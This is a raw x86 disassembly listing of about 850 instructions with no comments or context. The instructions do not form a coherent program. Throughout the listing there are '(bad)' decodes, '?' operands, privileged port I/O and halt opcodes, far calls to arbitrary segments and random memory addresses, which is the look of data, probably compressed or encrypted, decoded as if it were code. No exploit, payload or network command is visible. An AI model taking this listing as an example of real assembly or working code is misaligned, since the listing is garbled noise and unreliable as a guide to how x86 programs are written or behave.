  44df70:	in     al,0x3e
  44df72:	enter  0xc482,0xf6
  44df76:	and    BYTE PTR [ebp-0x128de96],ch
  44df7c:	sbb    ah,BYTE PTR [esi+0x27b548a4]
  44df82:	ins    BYTE PTR es:[edi],dx
  44df83:	xchg   edi,eax
  44df84:	mov    esp,0xed2e2298
  44df89:	xchg   BYTE PTR ds:0x7476b516,bh
  44df8f:	or     BYTE PTR [eax],cl
  44df91:	inc    edx
  44df92:	ss pushf 
  44df94:	mov    edx,0x8681d01b
  44df99:	inc    edi
  44df9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44df9b:	test   BYTE PTR [ecx],ah
  44df9d:	cld    
  44df9e:	sbb    dl,BYTE PTR [edi+0x7b]
  44dfa1:	or     BYTE PTR [edx+eiz*4-0x2e],bh
  44dfa5:	mov    esi,0x548a844a
  44dfaa:	mov    es,WORD PTR [ebp-0x17bb7613]
  44dfb0:	sar    BYTE PTR [ecx],0x46
  44dfb3:	sub    DWORD PTR [esp+edx*8+0x18],0xae9c31db
  44dfbb:	push   edx
  44dfbc:	xor    ch,ch
  44dfbe:	adc    BYTE PTR [ecx*1-0x37bd3c4f],cl
  44dfc5:	mov    ds:0x3045008c,eax
  44dfca:	sub    al,dh
  44dfcc:	jno    0x44e042
  44dfce:	fwait
  44dfcf:	stos   DWORD PTR es:[edi],eax
  44dfd0:	mov    dh,0x70
  44dfd2:	inc    ebp
  44dfd3:	mov    dh,0xc0
  44dfd5:	cmp    al,0xa
  44dfd7:	cmp    al,BYTE PTR [eax]
  44dfd9:	loop   0x44e01c
  44dfdb:	push   eax
  44dfdc:	lahf   
  44dfdd:	dec    eax
  44dfde:	jmp    0x44e031
  44dfe0:	je     0x44df8f
  44dfe2:	push   esi
  44dfe3:	jo     0x44dff3
  44dfe5:	push   ss
  44dfe6:	add    BYTE PTR [eax-0x16],0xf2
  44dfea:	dec    edi
  44dfeb:	test   DWORD PTR [ecx],eax
  44dfed:	jmp    0x44dff3
  44dfef:	dec    edx
  44dff0:	mov    ds:0x4b62e85e,al
  44dff5:	pop    ds
  44dff6:	push   esi
  44dff7:	xchg   edx,eax
  44dff8:	mov    al,ds:0xa94cd0c5
  44dffd:	inc    edx
  44dffe:	mov    dl,0x3f
  44e000:	jbe    0x44df8a
  44e002:	cmp    al,0xb1
  44e004:	loop   0x44e007
  44e006:	jp     0x44e016
  44e008:	jo     0x44e011
  44e00a:	dec    esi
  44e00b:	dec    edi
  44e00c:	lods   al,BYTE PTR ds:[esi]
  44e00d:	in     al,dx
  44e00e:	mov    ebx,0xb2bb6224
  44e013:	lock push es
  44e015:	call   0xf1674db0
  44e01a:	or     DWORD PTR [edi+0x5c6c9e44],edi
  44e020:	mov    esp,0x2d9f1966
  44e025:	cmp    al,0x64
  44e027:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44e028:	rol    BYTE PTR fs:[edx-0x3ffe81bb],1
  44e02f:	or     esi,DWORD PTR [eax]
  44e031:	mov    esp,0x518f7e5b
  44e036:	sti    
  44e037:	mov    eax,ds:0x955c049f
  44e03c:	pop    edx
  44e03d:	sbb    BYTE PTR [edx-0xfdfb997],dl
  44e043:	ret    
  44e044:	push   esp
  44e045:	rcr    BYTE PTR [esi],0x1c
  44e048:	loope  0x44e05a
  44e04a:	mov    DWORD PTR ds:0xd82b80df,eax
  44e050:	mov    al,0x74
  44e052:	sbb    dl,al
  44e054:	fdivr  DWORD PTR ds:0x5f7ca698
  44e05a:	lods   eax,DWORD PTR ds:[esi]
  44e05b:	gs call 0x88ef092e
  44e061:	repnz or esp,edx
  44e064:	mov    dl,0x67
  44e066:	rol    DWORD PTR [ebx+0x53],cl
  44e069:	shld   DWORD PTR [edx+0x11b1c064],edx,0x5
  44e071:	hlt    
  44e072:	es test al,0xec
  44e075:	cmp    al,BYTE PTR ds:[eax]
  44e078:	cmc    
  44e079:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44e07a:	mov    al,0x2c
  44e07c:	mov    ds:0x16e8c481,eax
  44e081:	add    DWORD PTR [ebx],eax
  44e083:	push   0x5116f0b0
  44e088:	jbe    0x44e01d
  44e08a:	arpl   WORD PTR [ebx],bx
  44e08c:	xor    al,0x5c
  44e08e:	sub    cl,ch
  44e090:	stos   BYTE PTR es:[edi],al
  44e091:	outs   dx,DWORD PTR ds:[esi]
  44e092:	js     0x44e0aa
  44e094:	push   eax
  44e095:	aaa    
  44e096:	mov    BYTE PTR [edx+0x70],bl
  44e099:	or     al,0xc
  44e09b:	inc    edi
  44e09c:	ins    BYTE PTR es:[edi],dx
  44e09d:	(bad)  
  44e09e:	nop
  44e09f:	lock retf 0x7e10
  44e0a3:	mov    dh,0xd7
  44e0a5:	call   0xfd9b:0x6680fd66
  44e0ac:	xor    BYTE PTR [esi+0x16529fe8],dl
  44e0b2:	cld    
  44e0b3:	xchg   DWORD PTR [edx],ecx
  44e0b5:	mov    ?,ecx
  44e0b7:	rcl    ah,0xa2
  44e0ba:	(bad)  
  44e0bb:	sahf   
  44e0bc:	xchg   ecx,eax
  44e0bd:	js     0x44e085
  44e0bf:	mov    eax,0xbc08874e
  44e0c4:	xor    al,0xcc
  44e0c6:	mov    bl,0x77
  44e0c8:	push   0xffffffe3
  44e0ca:	fwait
  44e0cb:	rol    cl,0x9c
  44e0ce:	or     al,0xd4
  44e0d0:	mov    al,ds:0x6ad03e18
  44e0d5:	mov    esi,0x48a21e
  44e0da:	sbb    esp,eax
  44e0dc:	push   ebx
  44e0dd:	(bad)  
  44e0de:	xchg   ebp,eax
  44e0df:	push   ecx
  44e0e0:	loope  0x44e119
  44e0e2:	test   al,0xbd
  44e0e4:	daa    
  44e0e5:	mov    bh,0x57
  44e0e7:	(bad)  
  44e0e8:	mov    ds:0xf836066b,eax
  44e0ed:	or     al,0xbe
  44e0ef:	mov    dh,0x71
  44e0f1:	test   DWORD PTR [eax+esi*2-0x707e5095],ebx
  44e0f8:	or     al,0x86
  44e0fa:	dec    esp
  44e0fb:	mov    edx,0xc3165d8f
  44e100:	push   0x2
  44e102:	or     BYTE PTR [ebx],ah
  44e104:	sub    al,0xd4
  44e106:	ror    BYTE PTR [ecx-0x60],1
  44e109:	xor    eax,0xfb3a335f
  44e10e:	in     al,dx
  44e10f:	test   DWORD PTR es:[ebp+0x7],eax
  44e113:	add    BYTE PTR [esi-0x5c12a39f],0x8
  44e11a:	fnstsw WORD PTR [edx]
  44e11c:	add    BYTE PTR [esi+ebx*8+0x280802cc],0xad
  44e124:	inc    edi
  44e125:	cmp    BYTE PTR [ecx+0x54],bh
  44e128:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44e129:	push   ebp
  44e12a:	mov    ah,0x41
  44e12c:	fmul   st,st(6)
  44e12e:	int3   
  44e12f:	mov    ecx,DWORD PTR [esi+eiz*1-0x43dfda1e]
  44e136:	call   0x1c0a:0x76502e4e
  44e13d:	pop    edx
  44e13e:	js     0x44e188
  44e140:	pushf  
  44e141:	pop    edx
  44e142:	push   cs
  44e143:	ins    BYTE PTR es:[edi],dx
  44e144:	arpl   dx,bp
  44e146:	mov    bl,0xba
  44e148:	or     al,0xa4
  44e14a:	stos   DWORD PTR es:[edi],eax
  44e14b:	rol    DWORD PTR ds:[edi+0x2cf0d8e8],0xf4
  44e153:	ficom  DWORD PTR [esp+eax*2]
  44e156:	or     eax,0x36b097b4
  44e15b:	sbb    eax,0x7cd37e92
  44e160:	jnp    0x44e191
  44e162:	mov    al,ds:0x96876a89
  44e167:	mov    dl,0xdc
  44e169:	add    bl,BYTE PTR [edx+0x5f]
  44e16c:	inc    edx
  44e16d:	fidiv  DWORD PTR [eax+0x1]
  44e170:	xor    al,0xa4
  44e172:	sahf   
  44e173:	sbb    ch,dl
  44e175:	ins    DWORD PTR es:[edi],dx
  44e176:	sbb    DWORD PTR [ebp-0x33e13bc2],0xffffffc5
  44e17d:	and    bl,cl
  44e17f:	xchg   ecx,eax
  44e180:	aas    
  44e181:	test   BYTE PTR [edx],0x7c
  44e184:	test   eax,0x705b1d49
  44e189:	mov    WORD PTR [esi+0x65],ss
  44e18c:	mov    ds:0x46864199,al
  44e191:	or     eax,0x5187e32b
  44e196:	call   0x67ffe410
  44e19b:	xchg   ch,al
  44e19d:	ss push es
  44e19f:	mov    esi,DWORD PTR [edx-0x379f27de]
  44e1a5:	(bad)  
  44e1a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44e1a7:	movups xmm0,xmm0
  44e1aa:	adc    eax,0x42b4b5ee
  44e1af:	rcl    BYTE PTR [ebx],cl
  44e1b1:	and    eax,0xc3736aec
  44e1b7:	add    esp,DWORD PTR [eax-0x2a316f84]
  44e1bd:	mov    al,dl
  44e1bf:	push   cs
  44e1c0:	add    bl,ah
  44e1c2:	or     DWORD PTR [eax+0x11546363],0xffffff80
  44e1c9:	dec    ebx
  44e1ca:	push   cs
  44e1cb:	sbb    al,0xca
  44e1cd:	rol    BYTE PTR [esi],0x7a
  44e1d0:	pusha  
  44e1d1:	shrd   DWORD PTR [esi+0x6c],edi,0x75
  44e1d6:	mov    bl,BYTE PTR [eax]
  44e1d8:	dec    eax
  44e1d9:	call   0x302e:0xab027e18
  44e1e0:	jl     0x44e224
  44e1e2:	shr    BYTE PTR [edi+0x1db4ca0c],cl
  44e1e8:	inc    edi
  44e1e9:	mov    ah,0x3a
  44e1eb:	cmp    al,0x22
  44e1ed:	(bad)  
  44e1ee:	jg     0x44e1e0
  44e1f0:	leave  
  44e1f1:	and    BYTE PTR [edx],al
  44e1f3:	lahf   
  44e1f4:	adc    BYTE PTR [ebp-0x7b72173a],0xed
  44e1fb:	adc    eax,edi
  44e1fd:	mov    ds:0xcbb6add1,al
  44e202:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44e203:	push   esi
  44e204:	pop    es
  44e205:	xchg   esi,eax
  44e206:	fimul  DWORD PTR [esi-0x74]
  44e209:	ss into 
  44e20b:	cmp    esp,esi
  44e20d:	sar    BYTE PTR [eax+0x13],1
  44e210:	scas   eax,DWORD PTR es:[edi]
  44e211:	add    bh,0xfa
  44e214:	lea    edi,[ecx-0x32]
  44e217:	pushf  
  44e218:	inc    esi
  44e219:	movlps xmm7,QWORD PTR [eax+0x45]
  44e21d:	fisub  WORD PTR [edx-0x792809bc]
  44e223:	fadd   DWORD PTR ss:[eax-0x5f0ddd85]
  44e22a:	push   eax
  44e22b:	mov    ah,0xb2
  44e22d:	js     0x44e278
  44e22f:	imul   ecx,DWORD PTR [ebx+0x49be536f],0x74
  44e236:	test   eax,0x3e00fc48
  44e23b:	mov    DWORD PTR [esi-0x6a73aa45],edi
  44e241:	inc    eax
  44e242:	sbb    ch,ch
  44e244:	adc    esp,DWORD PTR [ecx]
  44e246:	loopne 0x44e1ed
  44e248:	dec    ebx
  44e249:	mov    es,esp
  44e24b:	leave  
  44e24c:	or     DWORD PTR ds:0xcc1e343c,edx
  44e252:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44e253:	mov    dh,0x88
  44e255:	int    0xd1
  44e257:	dec    esp
  44e258:	call   0xdd7f66cf
  44e25d:	cdq    
  44e25e:	add    DWORD PTR [ecx+0x74beea6e],eax
  44e264:	pop    edx
  44e265:	dec    esp
  44e266:	sbb    eax,0x4802d04f
  44e26b:	pop    eax
  44e26c:	xor    DWORD PTR [edi+esi*2],edx
  44e26f:	pusha  
  44e270:	(bad)  
  44e271:	ins    BYTE PTR es:[edi],dx
  44e272:	popa   
  44e273:	xchg   DWORD PTR [ebp+0xc],edx
  44e276:	push   0x1e79e72e
  44e27b:	les    eax,FWORD PTR [esi+0x5dc00f66]
  44e281:	cmovbe edx,DWORD PTR [esi]
  44e284:	jo     0x44e230
  44e286:	cld    
  44e287:	lods   al,BYTE PTR ds:[esi]
  44e288:	xchg   DWORD PTR [edx],esp
  44e28a:	pop    esi
  44e28b:	mov    dl,ch
  44e28d:	jecxz  0x44e223
  44e28f:	fadd   st(5),st
  44e291:	pop    ss
  44e292:	lods   eax,DWORD PTR ds:[esi]
  44e293:	and    cl,BYTE PTR [eax+0x0]
  44e296:	add    bh,BYTE PTR [eax+esi*4+0x6be96fc5]
  44e29d:	and    DWORD PTR [edx+0x5e0b3869],ecx
  44e2a3:	sbb    BYTE PTR [eax+0xc],bh
  44e2a6:	sub    eax,0x786609e8
  44e2ab:	jmp    0x44e25d
  44e2ad:	fs push ds
  44e2af:	call   DWORD PTR [edi]
  44e2b1:	ret    0x130b
  44e2b4:	int3   
  44e2b5:	push   ss
  44e2b6:	loopne 0x44e2b6
  44e2b8:	sbb    cl,BYTE PTR [ebx]
  44e2ba:	pop    esp
  44e2bb:	inc    esi
  44e2bc:	and    edx,0xffffff9d
  44e2bf:	or     dh,BYTE PTR [eax+ecx*2]
  44e2c2:	aaa    
  44e2c3:	test   BYTE PTR [eax+0x70020388],0x13
  44e2ca:	mov    al,0x8f
  44e2cc:	xchg   BYTE PTR [edx],bl
  44e2ce:	or     BYTE PTR [edx+0x403580d0],ah
  44e2d4:	jmp    0xcb3a6fe0
  44e2d9:	aaa    
  44e2da:	icebp  
  44e2db:	add    BYTE PTR [edx],0x7
  44e2de:	lock sub BYTE PTR [esi],0x8
  44e2e2:	js     0x44e2ea
  44e2e4:	test   BYTE PTR ds:0x85d6cfa4,dl
  44e2ea:	pop    edi
  44e2eb:	jb     0x44e291
  44e2ed:	jl     0x44e30b
  44e2ef:	inc    edi
  44e2f0:	sbb    BYTE PTR [esi-0x17],0xa5
  44e2f4:	imul   edi,DWORD PTR [eax-0x72],0x40
  44e2f8:	loop   0x44e27a
  44e2fa:	lahf   
  44e2fb:	sub    al,0x14
  44e2fd:	sbb    DWORD PTR [eax-0x1c],eax
  44e300:	jb     0x44e35e
  44e302:	sub    eax,0x5dcd8196
  44e307:	jp     0x44e29f
  44e309:	add    BYTE PTR [esi-0x2e],dh
  44e30c:	mov    al,ds:0xfc6011c4
  44e311:	fcom   st(7)
  44e313:	sahf   
  44e314:	dec    esi
  44e315:	repnz sub BYTE PTR [esi],dh
  44e318:	cmp    dl,BYTE PTR [eax+eiz*4]
  44e31b:	and    al,0xdc
  44e31d:	or     BYTE PTR [esi],ah
  44e31f:	shl    BYTE PTR [eax],1
  44e321:	pop    esi
  44e322:	sub    BYTE PTR [esp+ebp*2+0x13],0x6c
  44e327:	(bad)  
  44e328:	push   ss
  44e329:	lock sub al,0x4c
  44e32c:	sub    ah,cl
  44e32e:	pop    edx
  44e32f:	push   edx
  44e330:	fbstp  TBYTE PTR [ebp+0x2925e101]
  44e336:	(bad)  
  44e337:	int    0xb3
  44e339:	mov    al,0xd4
  44e33b:	and    al,0x68
  44e33d:	mov    ah,BYTE PTR [eax]
  44e33f:	ja     0x44e354
  44e341:	lods   al,BYTE PTR ds:[esi]
  44e342:	and    BYTE PTR [esi-0x70],0x3a
  44e346:	inc    ecx
  44e347:	int3   
  44e348:	aam    0xe4
  44e34a:	adc    al,0x54
  44e34c:	push   esp
  44e34d:	pop    eax
  44e34e:	cs pop esi
  44e350:	cmp    ch,BYTE PTR [eax+0x16]
  44e353:	fst    QWORD PTR [eax+0x11340e61]
  44e359:	inc    ebp
  44e35a:	and    bl,BYTE PTR fs:[esi-0x7cf0bee4]
  44e361:	push   0xae5d81f4
  44e366:	xor    dh,bl
  44e368:	xchg   ecx,eax
  44e369:	aam    0x43
  44e36b:	push   es
  44e36c:	xchg   BYTE PTR [ecx-0x54],ah
  44e36f:	push   ss
  44e370:	sbb    al,dl
  44e372:	js     0x44e38e
  44e374:	cmp    ecx,DWORD PTR [eax-0x54]
  44e377:	push   edx
  44e378:	add    BYTE PTR [edx-0x46],dl
  44e37b:	xchg   esi,eax
  44e37c:	push   esi
  44e37d:	inc    esp
  44e37e:	sbb    al,0xd1
  44e380:	jo     0x44e3a2
  44e382:	fcmovnb st,st(0)
  44e384:	ss jo  0x44e323
  44e387:	test   BYTE PTR [edx-0x77],dl
  44e38a:	dec    esi
  44e38b:	fs add bl,bl
  44e38e:	loopne 0x44e350
  44e390:	test   eax,esi
  44e392:	push   edx
  44e393:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44e394:	inc    ebx
  44e395:	das    
  44e396:	mov    bl,BYTE PTR [eax+0x71]
  44e399:	push   es
  44e39a:	popf   
  44e39b:	and    ch,BYTE PTR [ebx]
  44e39d:	into   
  44e39e:	sub    BYTE PTR [ebx],dl
  44e3a0:	add    DWORD PTR [edx+ebx*8],edi
  44e3a3:	adc    ebp,ecx
  44e3a5:	push   0x65
  44e3a7:	shl    dh,0x6f
  44e3aa:	xor    BYTE PTR ds:0x91fe08aa,cl
  44e3b0:	sahf   
  44e3b1:	retf   
  44e3b2:	mov    ds:0x51a44000,al
  44e3b7:	dec    eax
  44e3b8:	cwde   
  44e3b9:	pop    ss
  44e3ba:	loop   0x44e3db
  44e3bc:	xor    al,0xbb
  44e3be:	cmp    dh,cl
  44e3c0:	or     BYTE PTR [edx-0x14],ah
  44e3c3:	(bad)  
  44e3c4:	jl     0x44e3da
  44e3c6:	xchg   edx,eax
  44e3c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44e3c8:	loop   0x44e34f
  44e3ca:	shl    BYTE PTR [edi],1
  44e3cc:	or     BYTE PTR [ebp+0xe],ch
  44e3cf:	cs call 0xd2c2:0x4598488a
  44e3d7:	mov    ss,WORD PTR [edx-0x61]
  44e3da:	fs popa 
  44e3dc:	shl    DWORD PTR [ecx],0x8e
  44e3df:	out    dx,eax
  44e3e0:	push   esp
  44e3e1:	inc    edx
  44e3e2:	adc    cl,BYTE PTR [edi-0xdc161f0]
  44e3e8:	imul   edx,DWORD PTR [edx-0x7b],0xd3a9cf6e
  44e3ef:	jo     0x44e439
  44e3f1:	xchg   esi,eax
  44e3f2:	mov    ah,BYTE PTR [eax+eiz*8-0x54da1efa]
  44e3f9:	rcr    BYTE PTR [esi-0x25],1
  44e3fc:	sub    BYTE PTR [edx+eiz*8-0x3ceaf519],ah
  44e403:	pop    DWORD PTR [ecx+0x1644305f]
  44e409:	(bad)  
  44e40a:	aam    0x14
  44e40c:	clc    
  44e40d:	cmp    al,0x82
  44e40f:	pop    esi
  44e410:	adc    ah,bl
  44e412:	xor    eax,0xe63200c6
  44e417:	lahf   
  44e418:	mov    ds:0x653c179a,al
  44e41d:	add    BYTE PTR [eax],cl
  44e41f:	(bad)  
  44e420:	inc    ebp
  44e421:	pusha  
  44e422:	xchg   edi,eax
  44e423:	sub    al,0x1d
  44e425:	scas   al,BYTE PTR es:[edi]
  44e426:	lods   eax,DWORD PTR ds:[esi]
  44e427:	dec    eax
  44e428:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44e429:	mov    bh,0xb6
  44e42b:	cmp    al,0xc6
  44e42d:	cmp    BYTE PTR [ebx+0x10005630],0x78
  44e434:	test   BYTE PTR [esi-0x30],bh
  44e437:	mov    esp,0xf5e3b67e
  44e43c:	imul   eax,esi,0xb9f0e694
  44e442:	dec    edx
  44e443:	mov    ds,WORD PTR [edx]
  44e445:	lods   eax,DWORD PTR ds:[esi]
  44e446:	cdq    
  44e447:	adc    bl,0xf0
  44e44a:	and    bl,BYTE PTR [bx+di+0x5a76]
  44e44f:	lds    edx,FWORD PTR [ebx-0x671b8bf7]
  44e455:	ss (bad) 
  44e457:	call   0x43a8314c
  44e45c:	js     0x44e45c
  44e45e:	hlt    
  44e45f:	mov    bl,0x36
  44e461:	call   0x50d5063b
  44e466:	and    al,0x63
  44e468:	mov    al,ds:0x21e0726c
  44e46d:	test   BYTE PTR [ebx-0x4e1b9f9a],dh
  44e473:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44e474:	cmp    cl,BYTE PTR [eax+0x66ed3a07]
  44e47a:	or     al,0x34
  44e47c:	lea    edx,[edi-0x2c]
  44e47f:	mov    edi,DWORD PTR [edx]
  44e481:	frstor [eax+0x7680d3e0]
  44e487:	add    ebx,esp
  44e489:	xor    DWORD PTR [esi-0x14954b3c],ecx
  44e48f:	push   ss
  44e490:	pop    ss
  44e491:	mov    eax,ds:0x1a6fc2df
  44e496:	mov    BYTE PTR [ebx+0x29],cl
  44e499:	je     0x44e4a3
  44e49b:	mov    eax,ds:0xf479c40a
  44e4a0:	mov    eax,0xfb4643d6
  44e4a5:	cmp    BYTE PTR [edi],dl
  44e4a7:	hlt    
  44e4a8:	hlt    
  44e4a9:	jg     0x44e497
  44e4ab:	scas   eax,DWORD PTR es:[edi]
  44e4ac:	push   edx
  44e4ad:	mov    al,ds:0x922240d2
  44e4b2:	xor    BYTE PTR ds:0x80b500d7,al
  44e4b8:	call   0x2e25:0xcf5b9aae
  44e4bf:	mov    dh,0x98
  44e4c1:	sub    al,BYTE PTR [esi+0x440ade9c]
  44e4c7:	xchg   DWORD PTR [eax-0x5363e28a],edx
  44e4cd:	out    0x37,al
  44e4cf:	out    dx,al
  44e4d0:	xchg   BYTE PTR [ecx],dh
  44e4d2:	sub    al,0xed
  44e4d4:	push   0x3a95c20d
  44e4d9:	setl   BYTE PTR [eax+0x680b4f67]
  44e4e0:	aas    
  44e4e1:	(bad)  
  44e4e2:	mov    edi,0xe8e80a6c
  44e4e7:	xchg   edx,eax
  44e4e8:	fimul  DWORD PTR [edx]
  44e4ea:	ret    
  44e4eb:	sbb    bl,cl
  44e4ed:	adc    al,0x52
  44e4ef:	es in  eax,0xa6
  44e4f2:	push   esp
  44e4f3:	pusha  
  44e4f4:	jne    0x44e551
  44e4f6:	pop    ds
  44e4f7:	ins    BYTE PTR es:[edi],dx
  44e4f8:	shr    BYTE PTR [eax],1
  44e4fa:	and    al,0x7a
  44e4fc:	scas   al,BYTE PTR es:[edi]
  44e4fd:	(bad)  
  44e4ff:	adc    cl,BYTE PTR [esp-0x2b]
  44e503:	xchg   esp,eax
  44e504:	js     0x44e509
  44e506:	add    ah,ah
  44e508:	cmp    al,0x1f
  44e50a:	xchg   BYTE PTR [esi],bh
  44e50c:	retf   
  44e50d:	dec    eax
  44e50e:	bound  esp,QWORD PTR [ebx]
  44e510:	mov    al,0x6b
  44e512:	or     eax,0x2d8e983c
  44e517:	mov    ah,0x9f
  44e519:	into   
  44e51a:	mov    bh,0xd2
  44e51c:	inc    edi
  44e51d:	or     BYTE PTR [edi+0x7a97f284],cl
  44e523:	jmp    0x6a5a:0xf487dba3
  44e52a:	lds    ebx,FWORD PTR [esi+0x7352eaa8]
  44e530:	adc    al,0xd3
  44e532:	xchg   BYTE PTR [edi+0x5b],al
  44e535:	sbb    al,BYTE PTR [ebp-0x2]
  44e538:	loopne 0x44e4f5
  44e53a:	or     BYTE PTR [edi],0xa6
  44e53d:	cmp    ch,BYTE PTR ds:0xe27abe38
  44e543:	sub    dh,bl
  44e545:	xchg   BYTE PTR ds:0x622975a8,al
  44e54b:	icebp  
  44e54c:	add    BYTE PTR [eax-0x1f4fdbaa],ch
  44e552:	dec    edx
  44e553:	sar    BYTE PTR [esi+0x789a4662],1
  44e559:	and    esi,eax
  44e55b:	mov    al,ds:0x922e0a20
  44e560:	or     bh,BYTE PTR [eax-0x60]
  44e563:	mov    al,ds:0x54112ad6
  44e568:	pusha  
  44e569:	scas   al,BYTE PTR es:[edi]
  44e56a:	mov    cl,BYTE PTR [edx+eax*4]
  44e56d:	push   ecx
  44e56e:	jecxz  0x44e593
  44e570:	lods   eax,DWORD PTR ds:[esi]
  44e571:	dec    edi
  44e572:	xchg   DWORD PTR es:[ebx-0x40],edx
  44e576:	lods   al,BYTE PTR ds:[esi]
  44e577:	imul   eax,DWORD PTR [ecx+0x3a23d45f],0xafdc7681
  44e581:	pop    edx
  44e582:	push   ebp
  44e583:	loopne 0x44e545
  44e585:	mov    eax,ds:0x6c3a9e28
  44e58a:	xchg   esp,eax
  44e58b:	sub    DWORD PTR [ecx-0x4bf3fd60],ecx
  44e591:	jmp    0x44e523
  44e593:	cmp    al,BYTE PTR es:[esi+edx*8-0x7816c8e4]
  44e59b:	shl    BYTE PTR [eax],1
  44e59d:	mov    ds:0xaccff456,al
  44e5a2:	xor    al,0x34
  44e5a4:	clc    
  44e5a5:	inc    eax
  44e5a6:	sub    bh,bh
  44e5a8:	test   eax,0x42998018
  44e5ad:	sti    
  44e5ae:	dec    eax
  44e5af:	push   ebp
  44e5b0:	hlt    
  44e5b1:	hlt    
  44e5b2:	cwde   
  44e5b3:	pop    ecx
  44e5b4:	fcom   st(1)
  44e5b6:	mov    WORD PTR [esi-0x3a6f90ea],ds
  44e5bc:	cdq    
  44e5bd:	add    al,0xaa
  44e5bf:	shl    al,0x78
  44e5c2:	xlat   BYTE PTR ds:[ebx]
  44e5c3:	(bad)  
  44e5c4:	out    0xc0,al
  44e5c6:	loopne 0x44e5fa
  44e5c8:	xchg   edx,eax
  44e5c9:	adc    bl,al
  44e5cb:	mov    eax,0xc845c64
  44e5d0:	xor    BYTE PTR [ecx-0x5b306fd4],dl
  44e5d6:	push   es
  44e5d7:	fst    QWORD PTR [edx]
  44e5d9:	mov    eax,0x96324e4
  44e5de:	loopne 0x44e603
  44e5e0:	lea    ebp,[edx+ecx*1]
  44e5e3:	pusha  
  44e5e4:	add    DWORD PTR ds:0xce76c034,ebp
  44e5ea:	gs push edx
  44e5ec:	retf   0x1780
  44e5ef:	retf   
  44e5f0:	inc    ebp
  44e5f1:	dec    edi
  44e5f2:	and    al,0x8a
  44e5f4:	loopne 0x44e655
  44e5f6:	in     al,0xaf
  44e5f8:	sahf   
  44e5f9:	sbb    al,0x92
  44e5fb:	call   0xaad6:0x94c09800
  44e602:	pop    edx
  44e603:	test   al,0x78
  44e605:	mov    esi,0x68ba1635
  44e60a:	fistp  DWORD PTR [esi-0x25]
  44e60d:	js     0x44e638
  44e60f:	mov    esi,0x23bedd3d
  44e614:	int3   
  44e615:	fwait
  44e616:	inc    esp
  44e617:	int    0x2b
  44e619:	push   ss
  44e61a:	jnp    0x44e61c
  44e61c:	ss lock jae 0x44e5e2
  44e620:	pop    esi
  44e621:	cdq    
  44e622:	jae    0x44e5ac
  44e624:	les    ecx,FWORD PTR [ebx]
  44e626:	inc    eax
  44e627:	push   es
  44e628:	mov    ?,WORD PTR [edi-0x26]
  44e62b:	add    BYTE PTR [edi+0x709b0af1],bh
  44e631:	push   ss
  44e632:	mov    al,ds:0x6eb28f7e
  44e637:	push   0x26
  44e639:	jmp    0x44e655
  44e63b:	loopne 0x44e5d3
  44e63d:	inc    esp
  44e63e:	push   ss
  44e63f:	mov    eax,ds:0xc09b485e
  44e644:	mov    esi,0x7c87c82e
  44e649:	ret    
  44e64a:	xchg   edx,eax
  44e64b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44e64c:	lock mov dl,BYTE PTR [esi]
  44e64f:	rol    ch,1
  44e651:	(bad)  
  44e652:	mov    al,ds:0xd9f69759
  44e658:	ret    0x601c
  44e65b:	sbb    al,BYTE PTR gs:[ecx-0x20]
  44e65f:	and    ecx,edx
  44e661:	push   ss
  44e662:	lahf   
  44e663:	pop    eax
  44e664:	aad    0xa4
  44e666:	adc    DWORD PTR [ebp-0x4e],ecx
  44e669:	push   ds
  44e66a:	add    dl,cl
  44e66c:	sub    eax,DWORD PTR es:[ebp-0x5]
  44e670:	xor    al,0x4
  44e673:	push   0x5e486215
  44e678:	fist   WORD PTR [edx-0x26]
  44e67b:	jbe    0x44e6aa
  44e67d:	push   0x40
  44e67f:	cmp    ch,BYTE PTR [eax-0x7f3fe99a]
  44e685:	cmp    BYTE PTR ds:0x9a698362,0x5e
  44e68c:	xchg   ebx,eax
  44e68d:	cmp    al,0xf2
  44e68f:	push   0x7
  44e691:	inc    ebx
  44e692:	adc    BYTE PTR [edi],cl
  44e694:	or     eax,0x6e366030
  44e699:	data16 loopne 0x44e637
  44e69c:	ror    BYTE PTR [esi-0x6b4ef3bb],1
  44e6a2:	ins    BYTE PTR es:[edi],dx
  44e6a3:	jp     0x44e6db
  44e6a5:	add    ebp,0x83161f8e
  44e6ab:	pop    edx
  44e6ac:	dec    edi
  44e6ad:	pop    eax
  44e6ae:	scas   eax,DWORD PTR es:[edi]
  44e6af:	and    BYTE PTR [eax],cl
  44e6b1:	stos   BYTE PTR es:[edi],al
  44e6b2:	dec    edi
  44e6b3:	mov    edx,0x8ef584a8
  44e6b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44e6b9:	xor    BYTE PTR [ecx],al
  44e6bb:	loope  0x44e6bd
  44e6bd:	xchg   BYTE PTR [eax],dl
  44e6bf:	(bad)
  44e6c2:	icebp  
  44e6c3:	mov    BYTE PTR [esi+0x2166ee3c],dh
  44e6c9:	push   esp
  44e6ca:	lock shr DWORD PTR ss:[edi+edx*4+0x71],1
  44e6d0:	push   ss
  44e6d1:	cs mov ah,0x78
  44e6d4:	dec    DWORD PTR [eax-0x39b8bdda]
  44e6da:	sub    al,0x16
  44e6dc:	pop    ebp
  44e6dd:	cli    
  44e6de:	and    eax,0xba3410fc
  44e6e3:	jns    0x44e727
  44e6e5:	popf   
  44e6e6:	popa   
  44e6e7:	mov    ds:0xbeca3da8,al
  44e6ec:	fwait
  44e6ed:	mov    dl,0x7a
  44e6ef:	(bad)  
  44e6f0:	fmul   DWORD PTR [eax-0x17bdfafb]
  44e6f6:	pusha  
  44e6f7:	iret   
  44e6f8:	ins    BYTE PTR es:[edi],dx
  44e6f9:	push   esp
  44e6fa:	or     al,0x6a
  44e6fc:	or     eax,0x5baa27c0
  44e701:	shr    BYTE PTR [edx+0x49b0060a],1
  44e707:	sbb    dl,BYTE PTR [ecx-0x783bfb1c]
  44e70d:	adc    eax,DWORD PTR fs:[edi-0x7f310b7a]
